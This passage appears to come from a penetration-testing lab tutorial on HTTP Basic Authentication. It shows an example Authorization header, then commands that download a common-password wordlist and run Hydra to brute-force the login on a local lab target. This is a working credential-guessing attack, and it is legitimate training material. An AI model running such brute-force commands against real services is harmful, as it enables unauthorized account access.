For example, the headers for Basic Auth in a HTTP GET request would look like:

```http
GET /protected_resource HTTP/1.1 
Host: www.example.com 
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```
## Exploiting Basic Auth with Hydra

```shell
# Download wordlist if needed 
3kjS@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt 
# Hydra command 
3kjS@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
